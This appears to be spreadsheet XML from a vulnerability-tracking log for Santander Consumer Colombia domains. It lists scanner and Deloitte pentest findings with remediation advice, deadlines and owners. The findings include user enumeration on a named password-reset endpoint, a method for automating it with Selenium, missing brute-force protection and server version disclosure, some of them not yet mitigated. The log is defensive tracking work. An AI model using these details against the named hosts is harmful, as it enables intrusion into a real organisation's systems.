    <m/>
    <s v="Portal de la financiera"/>
    <m/>
    <m/>
    <x v="55"/>
    <m/>
    <x v="0"/>
    <s v="Warm"/>
    <m/>
    <m/>
    <m/>
    <s v="www.santanderconsumer.co"/>
    <m/>
    <m/>
    <d v="2024-05-07T00:00:00"/>
    <n v="777"/>
    <d v="2024-08-05T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <d v="2025-01-21T00:00:00"/>
    <s v="El tamaño de la clave pública es inferior a 2048 bits_x000a__x000a_Algorithm_x000a_RSA_x000a__x000a_Key Length_x000a_1024_x000a__x000a_DKIM Record_x000a_TXT_x000a_k=rsa; t=s; p=MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQCuMByOYo3aEWY2vhx2GoPusDQu5R4ZV2JhZe2nrWjmhGw8Foot+NzwrXL1RV3A9ZRjIaLQ1GJm5Mf1jUqwoC7aJ7SQCv4O2g37/qkiQBjVeFsVzxyB0TMwfFbKM6spkt42d3FU6KiA5HXdF/B6NoEdDfnP6cediFm5L0KgElSjvQIDAQAB"/>
    <s v="Utilice la implementación de OpenSSL o SSL que prefiera para generar un nuevo par de claves y especifique una clave con una seguridad de 2048 bits o más en el momento de la generación. Implemente el par de claves más seguro en su configuración de DKIM."/>
    <m/>
    <m/>
    <m/>
    <s v="Jenny Rodriguez"/>
  </r>
  <r>
    <n v="93"/>
    <s v="SF"/>
    <s v="BitSight"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="MFT"/>
    <m/>
    <m/>
    <x v="56"/>
    <m/>
    <x v="2"/>
    <s v="Fair"/>
    <m/>
    <m/>
    <m/>
    <s v="mft.santanderconsumer.co"/>
    <n v="443"/>
    <m/>
    <d v="2024-04-25T00:00:00"/>
    <n v="789"/>
    <d v="2024-08-23T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="Política potencialmente insegura_x000a__x000a_La implementación de estos encabezados no sigue las mejores prácticas de seguridad._x000a__x000a_Directiva: script-src_x000a_Valor: &quot;Unsafe-inline&quot; es inseguro_x000a__x000a_Directiva: style-src_x000a_Valor: &quot;Unsafe-inline&quot;_x000a__x000a_Directiva: img-src_x000a_Valor: * Los asteriscos en la fuente son inseguros_x000a__x000a_Directiva: reporting-objective: No se utiliza ninguna directiva de notificación_x000a_Directiva: form-action-objective: Limitación de privilegios de la aplicación (Formulario-Acciones)_x000a_Directiva: code-injection-objective: Prevención limitada de inyección de código_x000a__x000a_https://mft.santanderconsumer.co/webclient/Login.xhtml"/>
    <s v="Elimine todas las instancias de directivas &quot;unsafe-&quot; y fuentes &quot;blob, data, filesystem&quot;. Asegúrese de que sus directivas CSP estén configuradas correctamente. Obtenga más información en W3C CSP ._x000a__x000a_Asegúrese de que los encabezados estén implementados correctamente, como se describe en RFC-7231 . Los encabezados no deben permitir el almacenamiento en caché de contenido cifrado. También deben tener permisos específicos (en lugar de utilizar comodines u otras generalizaciones) y estar formateados correctamente._x000a__x000a_Elimina la palabra clave &quot;unsafe-inline&quot; de tu política de seguridad de contenido._x000a__x000a_Elimine cualquier instancia del carácter asterisco (*) que se encuentre solo de su política de seguridad de contenido._x000a__x000a_Incluya una directiva de informe con una ubicación o grupo válido._x000a__x000a_Incluya la directiva form-actions en su CSP._x000a__x000a_No utilice ninguna palabra clave &quot;insegura&quot; y utilice hosts explícitos para cualquier directiva de lista de fuentes._x000a_"/>
    <m/>
    <m/>
    <m/>
    <s v="Jorge Guzman"/>
  </r>
  <r>
    <n v="94"/>
    <s v="SF"/>
    <s v="BitSight"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Portal de la financiera"/>
    <m/>
    <m/>
    <x v="57"/>
    <m/>
    <x v="0"/>
    <s v="Fair"/>
    <m/>
    <m/>
    <m/>
    <s v="www.santanderconsumer.co"/>
    <n v="443"/>
    <m/>
    <d v="2024-05-04T00:00:00"/>
    <n v="780"/>
    <d v="2024-09-01T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <d v="2025-01-21T00:00:00"/>
    <s v="Atributo de integridad faltante_x000a__x000a_La página no incluye un atributo de integridad en la obtención de scripts entre dominios._x000a__x000a_Recurso: https://www.googletagmanager.com/gtag/js?id=G-4W6ZMRLK1B&amp;l=dataLayer&amp;cx=c_x000a__x000a_https://www.googletagmanager.com/gtag/js?id=G-4W6ZMRLK1B_x000a__x000a_https://www.googletagmanager.com/gtag/js?id=G-5N7QGZ8B0M_x000a__x000a_https://unpkg.com/@popperjs/core@2_x000a__x000a_https://unpkg.com/tippy.js@6_x000a__x000a_Falta el atributo de integridad_x000a__x000a_https://www.google.com/recaptcha/api.js?render=6LcBbTYiAAAAAFbK3rSpWk2V8w315JvH7z9ycQbm"/>
    <s v="Los propietarios de sitios web deben evitar cargar scripts de recursos de terceros, evitando la exposición a la manipulación de contenido y JavaScript por parte de terceros o en caso de una vulneración de la red. Si la carga de scripts de terceros es inevitable, se deben utilizar etiquetas de integridad de subrecursos siempre que sea posible. Para obtener más información, consulte: Integridad de subrecursos"/>
    <m/>
    <m/>
    <m/>
    <s v="Jenny Rodriguez"/>
  </r>
  <r>
    <n v="95"/>
    <s v="SF"/>
    <s v="BitSight"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Portal de la financiera"/>
    <m/>
    <m/>
    <x v="56"/>
    <m/>
    <x v="0"/>
    <s v="Fair"/>
    <m/>
    <m/>
    <m/>
    <s v="www.santanderconsumer.co"/>
    <n v="443"/>
    <m/>
    <d v="2024-06-25T00:00:00"/>
    <n v="728"/>
    <d v="2024-10-23T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <d v="2025-01-21T00:00:00"/>
    <s v="Esta Política de Seguridad de Contenido (CSP) tiene problemas que posiblemente la hagan insegura._x000a__x000a_Directiva: script-src_x000a_Valor: “Unsafe-inline” es inseguro_x000a__x000a_Directiva: style-src_x000a_Valor: “Unsafe-inline” es inseguro_x000a__x000a_Directiva: img-src_x000a_Valor: “Blob” fuente insegura_x000a__x000a_Directiva: font-src_x000a_Valor: “Data” fuente insegura_x000a__x000a_Directiva: reporting-objective_x000a_Directiva: code-injection-objective_x000a_"/>
    <s v="Asegúrese de que los encabezados estén implementados correctamente, como se describe en RFC-7231 . Los encabezados no deben permitir el almacenamiento en caché de contenido cifrado. También deben tener permisos específicos (en lugar de utilizar comodines u otras generalizaciones) y estar formateados correctamente._x000a__x000a__x000a_Elimina la palabra clave &quot;unsafe-inline&quot; de tu política de seguridad de contenido._x000a__x000a_Elimina &quot;blob:&quot; de la lista de fuentes en tu política de seguridad de contenido._x000a__x000a_Elimina &quot;datos:&quot; de la lista de fuentes en tu política de seguridad de contenido._x000a__x000a_reporting-objective Incluya una directiva de informe con una ubicación o grupo válido._x000a__x000a_code-injection-objective No utilice ninguna palabra clave &quot;insegura&quot; y utilice hosts explícitos para cualquier directiva de lista de fuentes."/>
    <m/>
    <m/>
    <m/>
    <s v="Jenny Rodriguez"/>
  </r>
  <r>
    <n v="96"/>
    <s v="SF"/>
    <s v="SecurityScorecard"/>
    <s v="Infraestructura"/>
    <m/>
    <m/>
    <s v="Correos electronicos"/>
    <m/>
    <m/>
    <x v="58"/>
    <m/>
    <x v="2"/>
    <s v="High"/>
    <m/>
    <m/>
    <m/>
    <s v="emaillink.santanderconsumer.co"/>
    <n v="443"/>
    <m/>
    <d v="2024-08-05T00:00:00"/>
    <n v="687"/>
    <d v="2024-09-04T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="Cuando una autoridad de certificación (CA) emite un certificado, incorpora URL que se pueden utilizar para comprobar si se ha revocado un certificado. Los certificados revocados ya no son válidos y los clientes TLS (por ejemplo, los navegadores web) se negarán a conectarse a servidores que presenten certificados revocados. Los certificados se revocan por diversas razones: el desmantelamiento de un servidor, el retiro de un producto o nombre comercial, la renovación anticipada de un certificado de reemplazo o la creencia de que un atacante puede haber adquirido la clave privada correspondiente del certificado. La presencia de un certificado revocado en Internet es una indicación de que una organización carece de una política de gestión de certificados o no la cumple, o de que la organización ha sufrido una infracción que no se ha solucionado por completo."/>
    <s v="Si el servicio no está en uso, desactívelo. De lo contrario, comuníquese con la CA y solicite la emisión de un nuevo certificado."/>
    <s v="Los certificados revocados impiden que los clientes TLS se conecten a los servidores."/>
    <m/>
    <m/>
    <s v="Jenny Alejandra Rodriguez"/>
  </r>
  <r>
    <n v="97"/>
    <s v="SF"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Autofinance"/>
    <s v="MAN-67160b3196d088205b831aec"/>
    <s v="SCO-24-CNMPO-019-AP-001"/>
    <x v="59"/>
    <m/>
    <x v="2"/>
    <s v="Medium"/>
    <n v="5.0999999999999996"/>
    <m/>
    <m/>
    <s v="autofinance.santanderfinancing.com"/>
    <m/>
    <m/>
    <d v="2024-10-21T00:00:00"/>
    <n v="610"/>
    <d v="2025-01-19T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="Durante las pruebas se ha identificado la posibilidad de enumerar usuarios de la aplicación a través del formulario de “¿Olvidaste tu contraseña?”, vulnerabilidad SCO-24-CNMPO-019-AP-002. Se intento automatizar dicha enumeración para evaluar el riesgo final de la misma, pero se identificó que al igual que para otras operaciones de la aplicación, el cuerpo de la peticiones es cifrado antes de su envío. Esto supone una dificultad variable cuando se trabaja a nivel del protocolo HTTP (herramienta proxy Burpsuite). El enfoque alternativo elegido para evadir la dificultad añadida de cifrar las peticiones ha sido subir al nivel de aplicación, controlando el navegador mediante la librería selenium en Python y  opcionalmente, haciendo pasar dicho navegador por la herramienta proxy para analizar las respuestas del servidor._x000a__x000a_Mediante el script compartido al final, el navegador es controlado automatizando la tarea de probar una lista de nombres de usuario, a la par que la operación de cifrado es transparente para el atacante. La prueba de concepto se realizó sobre una lista total de solo 10 candidatos para no causar impacto en el entorno en producción."/>
    <s v="Se recomienda que los mecanismos desplegados, siempre tengan un componente del lado del_x000a_servidor, ya que del lado del cliente siempre será posible evadirlos con el suficiente tiempo. Para el_x000a_caso concreto de la prueba de concepto, al tratarse de un formulario de recordar clave, el _x000a_mecanismo más efectivo es el correcto despliegue de un captcha."/>
    <s v="La posibilidad de poder evadir elemento de control anti-fuerzabruta abre la posibilidad de poder atacar formularios de la aplicación expuestos en la parte pública con mecanismos automatizados y múltiples finalidades como podrían ser enumeración de usuarios, ataques de diccionario contra cuentas enumeradas o denegación de servicio a través de formularios de contacto."/>
    <s v="1° Fecha: 31/01/2025"/>
    <s v="Se esta en proceso de baja del servicio "/>
    <s v="Jenny Alejandra Rodriguez"/>
  </r>
  <r>
    <n v="98"/>
    <s v="SF"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Autofinance"/>
    <s v="MAN-671608a796d088205b831aeb"/>
    <s v="SCO-24-CNMPO-019-AP-002"/>
    <x v="15"/>
    <m/>
    <x v="2"/>
    <s v="Medium"/>
    <n v="5.0999999999999996"/>
    <m/>
    <m/>
    <s v="autofinance.santanderfinancing.com"/>
    <m/>
    <m/>
    <d v="2024-10-21T00:00:00"/>
    <n v="610"/>
    <d v="2025-01-19T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="El aplicativo o servicio muestra mensajes distintos que permiten discernir si un determinado usuario es un usuario válido en el sistema o aplicación afectada._x000a__x000a_Función: “¿Olvidaste tu contraseña?”_x000a_Método: POST //account/v1/account/generate_reset_code"/>
    <s v="Se recomienda que el aplicativo no permita desvelar si un usuario está registrado en el sistema. Así mismo, se recomienda que el mecanismo de autenticación no proporcione evidencias que_x000a_permitan discernir si el usuario introducido está dado de alta, o no, mediante mensajes de error,_x000a_tamaño de las respuestas del servidor o tiempos de respuesta de la aplicación. Siendo un mensaje_x000a_genérico de acceso incorrecto la mejor opción en estos casos._x000a__x000a_En concreto una solución adecuada seria que independientemente de la existencia o no del usuario_x000a_la aplicación respondiera: ”Si su usuario está registrado, enviaremos un link de restablecimiento de_x000a_contraseña al correo electrónico registrado en el sistema”."/>
    <s v="Esta vulnerabilidad podría ser utilizada por un atacante para intentar obtener un listado de los usuarios del sistema. Posteriormente, podría utilizar dicha información para planificar y generar ataques de mayor impacto en el aplicativo como, por ejemplo, ataques de averiguación de contraseñas, ataques de phishing, ataques de fuerza bruta o &quot;password spraying&quot; sobre las contraseñas de los usuarios existentes en el sistema con la finalidad de obtener acceso a alguna cuenta de usuario o administrador."/>
    <s v="1° Fecha: 31/01/2025_x000a_2° Fecha: 30/05/2025"/>
    <s v="Se esta en proceso de baja del servicio "/>
    <s v="Jenny Alejandra Rodriguez"/>
  </r>
  <r>
    <n v="99"/>
    <s v="SF"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="MFT"/>
    <s v="MAN-672dd4a84475a96487b264b1"/>
    <s v="SCO-24-CNMPO-016-CO-001"/>
    <x v="60"/>
    <m/>
    <x v="2"/>
    <s v="Medium"/>
    <n v="5.3"/>
    <m/>
    <m/>
    <s v="mft.santanderconsumer.co"/>
    <n v="443"/>
    <m/>
    <d v="2024-11-05T00:00:00"/>
    <n v="595"/>
    <d v="2025-02-03T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="El formulario de autenticación de la aplicación carece de mecanismos que prevengan el envío masivo y automatizado de solicitudes, como un sistema CAPTCHA. Esto permite la posibilidad de que un usuario malintencionado intente repetidamente adivinar credenciales de acceso mediante un gran número de combinaciones posibles, lo que incrementa el riesgo de acceso no autorizado._x000a_"/>
    <s v="Para mitigar la vulnerabilidad de ausencia de mecanismos de protección contra ataques de fuerza bruta, se recomienda implementar mecanismos de prevención contra la automatización de peticiones, como la incorporación de un CAPTCHA, otras medidas de seguridad incrementarían la seguridad del activo, como:_x000a_• Limitación de intentos de autenticación: Implementar mecanismos que limiten el número de intentos de autenticación fallidos. Después de varios intentos fallidos, la cuenta debe ser bloqueada temporalmente o la dirección IP debe ser bloqueada._x000a_• Autenticación multifactor (MFA): Habilitar la autenticación multifactor para todos los accesos a servicios críticos. Esto agrega una capa adicional de seguridad, requiriendo no solo la contraseña sino también una segunda forma de verificación._x000a_• Monitoreo y alerta de actividades sospechosas: Implementar soluciones de monitoreo que detecten y alerten sobre intentos repetidos de autenticación fallida, permitiendo una respuesta rápida a posibles ataques de fuerza bruta._x000a_• Políticas de contraseñas fuertes: Implementar políticas de contraseñas que requieran el uso de contraseñas fuertes y únicas, y fomentar el cambio periódico de contraseñas para reducir el riesgo de adivinanza de credenciales._x000a_• Registro y auditoría: Mantener registros detallados de los intentos de autenticación y realizar auditorías regulares para identificar patrones inusuales que puedan indicar un ataque de fuerza bruta._x000a_• Seguridad en la configuración de servicios: Asegurar que servicios como FTP, SSH o RDP estén configurados con las mejores prácticas de seguridad, incluyendo el uso de puertos no estándar y la deshabilitación de accesos innecesarios."/>
    <s v="La ausencia de protección contra automatización permite a un usuario malintencionado realizar ataques de fuerza bruta de manera eficaz, aumentando la probabilidad de obtener acceso no autorizado y exponiendo el sistema a potenciales accesos no autorizados, con los siguientes riesgos significativos:_x000a_• Acceso no autorizado: Obtener acceso no autorizado a servicios críticos mediante la adivinanza de credenciales, comprometiendo la seguridad del sistema._x000a_• Compromiso de información sensible: Podrían visualizarse, modificarse o eliminarse información sensible, afectando la confidencialidad e integridad de los datos._x000a_• Disminución del rendimiento del sistema: Los intentos repetidos y automáticos de autenticación pueden sobrecargar los servicios afectados, degradando su rendimiento y afectando la disponibilidad del sistema._x000a_• Escalada de privilegios: Si un usuario malintencionado lograra acceder a una cuenta con bajos privilegios, podría intentar escalar privilegios para obtener acceso a áreas más críticas del sistema._x000a_• Explotación adicional de vulnerabilidades: Un acceso inicial no autorizado puede ser utilizado como punto de partida para explotar otras vulnerabilidades dentro del sistema y extender el alcance del ataque."/>
    <m/>
    <m/>
    <s v="Jorge Guzman"/>
  </r>
  <r>
    <n v="100"/>
    <s v="SF"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="MFT"/>
    <s v="MAN-672dd4ec4475a96487b264b2"/>
    <s v="SCO-24-CNMPO-016-AP-002"/>
    <x v="61"/>
    <m/>
    <x v="2"/>
    <s v="Low"/>
    <n v="4.3"/>
    <m/>
    <m/>
    <s v="mft.santanderconsumer.co"/>
    <n v="443"/>
    <m/>
    <d v="2024-11-05T00:00:00"/>
    <n v="595"/>
    <d v="2025-03-05T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="No existe un control del número de sesiones abiertas por cada usuario en la aplicación, lo que puede permitir abrir múltiples sesiones al mismo tiempo desde distintas IPs y dispositivos de forma simultánea. Generalmente se considera que un usuario legítimo sólo debería autenticarse en la aplicación una vez de forma simultánea, ya que un usuario malicioso, si consiguiera su cookie de sesión, podría acceder a su panel personal y realizar cualquier tipo de acción sin su consentimiento y sin que este se percatara."/>
    <s v="Es decisión del diseño de la aplicación determinar si se permiten múltiples conexiones simultáneas del mismo usuario desde diferentes direcciones IP o dispositivos. Si la aplicación no desea permitir el inicio de sesión simultáneo, debe realizar acciones efectivas después de cada nuevo evento de autenticación, finalizando implícitamente la sesión previamente disponible, o preguntando al usuario (a través de las sesiones antiguas, nuevas o ambas) sobre la sesión que debe permanecer activa. Se recomienda desactivar dicha característica en caso de no ser necesaria."/>
    <s v="Si un usuario malintencionado consiguiera la cookie de sesión de un usuario legítimo, podría acceder a su panel personal y realizar cualquier tipo de acción sin su consentimiento y sin que este se percatara."/>
    <m/>
    <m/>
    <s v="Jorge Guzman"/>
  </r>
  <r>
    <n v="101"/>
    <s v="SF"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Motor"/>
    <s v="MAN-673f4c6a86437e5a65e31bd6"/>
    <s v="SCO-24-CNMPO-017-CO-001"/>
    <x v="10"/>
    <m/>
    <x v="1"/>
    <s v="Medium"/>
    <n v="4.4000000000000004"/>
    <s v="CVE-2021-44790_x000a_CVE-2021-40438_x000a_CVE-2021-33193_x000a_CVE-2021-33196_x000a_CVE-2021-37411_x000a_CVE-2021-36160_x000a_CVE-2019-0211_x000a_CVE-2017-15710_x000a_CVE-2018-1303_x000a_CVE-2017-15715_x000a_CVE-2016-8743_x000a_CVE-2019-0211"/>
    <m/>
    <s v="motor.santanderconsumer.co"/>
    <m/>
    <m/>
    <d v="2024-11-19T00:00:00"/>
    <n v="581"/>
    <d v="2025-02-17T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="Durante las pruebas realizadas, se ha observado cómo la aplicación devuelve información relativa sobre el servidor y la versión._x000a_Esta información es mostrada en la respuesta procedentes del servidor"/>
    <s v="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
    <s v="Conocer tipo concreto del servidor web utilizado para sustentar el aplicativo, y su versión, permite a un atacante localizar vulnerabilidades conocidas y los exploits apropiados para las mismas, así como generar ataques más elaborados contra la plataforma."/>
    <s v="1° Fecha: 28/02/2025_x000a_2° Fecha: 30/05/2025"/>
    <m/>
    <s v="Jenny Alejandra Rodriguez"/>
  </r>
  <r>
    <n v="102"/>
    <s v="SF"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Aliados"/>
    <s v="MAN-673f4cb686437e5a65e31bd7"/>
    <s v="SCO-24-CNMPO-017-CO-002"/>
    <x v="10"/>
    <m/>
    <x v="2"/>
    <s v="Medium"/>
    <n v="4.4000000000000004"/>
    <s v="CVE-2021-44790_x000a_CVE-2021-40438_x000a_CVE-2021-33193_x000a_CVE-2021-33196_x000a_CVE-2021-37411_x000a_CVE-2021-36160_x000a_CVE-2019-0211_x000a_CVE-2017-15710_x000a_CVE-2018-1303_x000a_CVE-2017-15715_x000a_CVE-2016-8743_x000a_CVE-2019-0211"/>
    <m/>
    <s v="aliados.santanderconsumer.co"/>
    <m/>
    <m/>
    <d v="2024-11-19T00:00:00"/>
    <n v="581"/>
    <d v="2025-02-17T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="Durante las pruebas realizadas, se ha observado cómo la aplicación devuelve información relativa sobre el servidor y la versión._x000a_Esta información es mostrada en la respuesta procedentes del servidor"/>
    <s v="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
    <s v="Conocer tipo concreto del servidor web utilizado para sustentar el aplicativo, y su versión, permite a un atacante localizar vulnerabilidades conocidas y los exploits apropiados para las mismas, así como generar ataques más elaborados contra la plataforma."/>
    <s v="1° Fecha: 31/01/2025_x000a_2° Fecha: 30/05/2025"/>
    <m/>
    <s v="Jenny Alejandra Rodriguez"/>
  </r>
  <r>
    <n v="103"/>
    <s v="SF"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Aliados"/>
    <s v="MAN-673f4cf886437e5a65e31bd8"/>
    <s v="SCO-24-CNMPO-017-AP-003"/>
    <x v="9"/>
    <m/>
    <x v="2"/>
    <s v="Medium"/>
    <n v="4"/>
    <m/>
    <m/>
    <s v="aliados.santanderconsumer.co"/>
    <m/>
    <m/>
    <d v="2024-11-19T00:00:00"/>
    <n v="581"/>
    <d v="2025-02-17T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="Durante las pruebas realizadas se ha observado que las cookies asociadas a la gestión de la sesión del usuario no tienen aplicado el atributo de seguridad &quot;HttpOnly&quot;. Este atributo impide el robo del identificador de sesión del usuario almacenado en la cookie mediante ataques de Cross Site Scripting, ya que no permite el acceso a la misma mediante scripts del lado del cliente."/>
    <s v="Se recomienda proteger los identificadores de sesión, almacenados a través de las cookies, mediante el atributo de seguridad &quot;HttpOnly&quot;. De esta manera se evita que se pueda acceder al identificador de sesión desde secuencias de comandos (JavaScript, ActiveX). _x000a__x000a_La solución concreta dependerá del lenguaje o framework en el que esté implementado la aplicación."/>
    <s v="El robo de identificadores de la sesión de un usuario a través de las cookies podría permitir a un atacante acceder a las sesiones privadas de otros usuarios, suplantando la identidad de estos dentro de la aplicación."/>
    <s v="1° Fecha: 31/01/2025_x000a_2° Fecha: 30/05/2025"/>
    <m/>
    <s v="Jenny Alejandra Rodriguez"/>
  </r>
  <r>
    <n v="104"/>
    <s v="SF"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Motor"/>
    <s v="MAN-673f4dd986437e5a65e31bea"/>
    <s v="SCO-24-CNMPO-017-AP-004"/>
    <x v="62"/>
    <m/>
    <x v="1"/>
    <s v="Low"/>
    <n v="3.9"/>
    <m/>
    <m/>
    <s v="motor.santanderconsumer.co"/>
    <m/>
    <m/>
    <d v="2024-11-19T00:00:00"/>
    <n v="581"/>
    <d v="2025-03-19T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="La vulnerabilidad de enumeración de directorios ocurre cuando un servidor web permite ver el contenido de directorios, exponiendo archivos sensibles. Esto facilita a los atacantes identificar recursos importantes, como configuraciones o scripts vulnerables. La prevención incluye deshabilitar el listado de directorios y proteger archivos con permisos adecuados."/>
    <s v="Se recomienda evitar que el servidor web devuelva información de la existencia o no de un determinado directorio basándose en las respuestas de error o en los códigos HTTP de respuesta."/>
    <s v="Un atacante podría enumerar la existencia de determinados directorios en el sistema objetivo con la finalidad de averiguar si se encuentran instalados en el sistema ciertos componentes o librerías que le ayuden a diseñar ataques más específicos contra la plataforma."/>
    <s v="1° Fecha: 28/02/2025_x000a__x000a_2°Sin fecha "/>
    <s v="Aun se estan realizando las validaciones correspondientes para realizar la mitigacion "/>
    <s v="Jenny Alejandra Rodriguez"/>
  </r>
  <r>
    <n v="105"/>
    <s v="SF"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Aliados"/>
    <s v="MAN-673f4e1c86437e5a65e31bf9"/>
    <s v="SCO-24-CNMPO-017-CO-005"/>
    <x v="47"/>
    <m/>
    <x v="2"/>
    <s v="Low"/>
    <n v="3.8"/>
    <m/>
    <m/>
    <s v="aliados.santanderconsumer.co"/>
    <m/>
    <m/>
    <d v="2024-11-19T00:00:00"/>
    <n v="581"/>
    <d v="2025-03-19T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="La ausencia de una cabecera CSP (Content Security Policy) correctamente configurada, disminuye las capacidades de seguridad de esta, aumentando la susceptibilidad de la aplicación a múltiples ataques relacionados con el uso de JavaScript, como XSS. Esta cabecera es empleada para controlar los recursos JavaScript cargados en la web, pudiendo controlar los terceros que pueden cargar scripts dentro de la página._x000a__x000a_Se ha detectado que los activos no contienen la cabecera Content-Security-Policy."/>
    <s v="Para implementar esta cabecera es necesario realizar un análisis completo de la aplicación a securizar y observar los recursos que utiliza la misma, si son locales o provienen de cierta página externa, e incluirlos en la cabecera, ya que esta va a actuar como una lista blanca para los recursos. Para habilitar la cabecera CSP, es necesario configurar el servidor web para que devuelva la cabecera HTTP Content-Security-Policy. _x000a_Bajo ningún concepto se deberá utilizar las directivas ‘unsafe-inline’ y ‘unsafe-eval’, al menos sobre “default-src”, o directivas relativas a JavaScript, como “script-src”, ya que anulan gran parte de las capacidades de seguridad de la cabecera. _x000a_Un ejemplo de configuración de cabecera es el siguiente: _x000a_· Content-Security-Policy: default-src 'self' *.trusted.com _x000a_Alternativamente, el elemento &lt;meta&gt; puede ser usado para configurar una política, por ejemplo: _x000a_· &lt;meta http-equiv=&quot;Content-Security-Policy&quot; content=&quot;default-src 'self'; img-src https://*; child-src 'none';&quot;&gt;"/>
    <s v="La ausencia de la cabecera &quot;Content Security Policy&quot; puede permitir a un atacante que localice una vulnerabilidad de tipo &quot;Cross Site Scripting&quot; explotar la vulnerabilidad sin encontrarse ningún sistema de protección que mitigue su impacto. El resultado de este ataque podría ser, la obtención información acerca de tokens de sesión, cookies y demás información sensible que un cliente pueda estar transmitiendo al sitio web."/>
    <s v="1° Fecha: 30/05/2025"/>
    <m/>
    <s v="Jenny Alejandra Rodriguez"/>
  </r>
  <r>
    <n v="106"/>
    <s v="SF"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Aliados"/>
    <s v="MAN-673f519e86437e5a65e31da0"/>
    <s v="SCO-24-CNMPO-017-CO-006"/>
    <x v="63"/>
    <m/>
    <x v="2"/>
    <s v="Low"/>
    <n v="3.8"/>
    <m/>
    <m/>
    <s v="aliados.santanderconsumer.co"/>
    <m/>
    <m/>
    <d v="2024-11-19T00:00:00"/>
    <n v="581"/>
    <d v="2025-03-19T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="Durante la realización de las pruebas se ha podido comprobar que el servidor no responde con la cabecera Permissions-Policy. Esta cabecera permite controlar que origines pueden utilizar que características del navegador._x000a__x000a_Se ha detectado que los activos no contienen la cabecera Permission-Policy"/>
    <s v="Se recomienda configurar la cabecera y deshabilitar todas las funciones que el dominio no necesite o permitir sólo a los dominios autorizados: _x000a_Permissions-Policy: geolocation=() camera=(), microphone=() _x000a_NOTA: Este ejemplo deshabilita la geolocalización, la cámara y el micrófono para todos los dominios."/>
    <s v="La ausencia de la cabecera Permissions-Policy podría permitir a un atacante abusar de algún tipo de inyección, por ejemplo, un XSS, para activar la cámara, el micrófono u otra característica del navegador."/>
    <s v="1° Fecha:28/02/2025_x000a_2° Fecha: 30/05/2025"/>
    <m/>
    <s v="Jenny Alejandra Rodriguez"/>
  </r>
  <r>
    <n v="107"/>
    <s v="SF"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Motor"/>
    <s v="MAN-673f51ed86437e5a65e31dc0"/>
    <s v="SCO-24-CNMPO-017-CO-007"/>
    <x v="63"/>
    <m/>
    <x v="1"/>
    <s v="Low"/>
    <n v="3.8"/>
    <m/>
    <m/>
    <s v="motor.santanderconsumer.co"/>
    <m/>
    <m/>
    <d v="2024-11-19T00:00:00"/>
    <n v="581"/>
    <d v="2025-03-19T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="Durante la realización de las pruebas se ha podido comprobar que el servidor no responde con la cabecera Permissions-Policy. Esta cabecera permite controlar que origines pueden utilizar que características del navegador._x000a__x000a_Se ha detectado que los activos no contienen la cabecera Permission-Policy"/>
    <s v="Se recomienda configurar la cabecera y deshabilitar todas las funciones que el dominio no necesite o permitir sólo a los dominios autorizados: _x000a_Permissions-Policy: geolocation=() camera=(), microphone=() _x000a_NOTA: Este ejemplo deshabilita la geolocalización, la cámara y el micrófono para todos los dominios."/>
    <s v="La ausencia de la cabecera Permissions-Policy podría permitir a un atacante abusar de algún tipo de inyección, por ejemplo, un XSS, para activar la cámara, el micrófono u otra característica del navegador."/>
    <s v="1° Fecha: 30/05/2025"/>
    <m/>
    <s v="Jenny Alejandra Rodriguez"/>
  </r>
  <r>
    <n v="108"/>
    <s v="SF"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Aliados"/>
    <s v="MAN-673f52d586437e5a65e31e1a"/>
    <s v="SCO-24-CNMPO-017-CO-008"/>
    <x v="64"/>
    <m/>
    <x v="2"/>
    <s v="Low"/>
    <n v="3.8"/>
    <m/>
    <m/>
    <s v="aliados.santanderconsumer.co"/>
    <m/>
    <m/>
    <d v="2024-11-19T00:00:00"/>
    <n v="581"/>
    <d v="2025-03-19T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="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_x000a__x000a_Se ha detectado que los activos no contienen la cabecera Cross-Origin-Embedder-Policy."/>
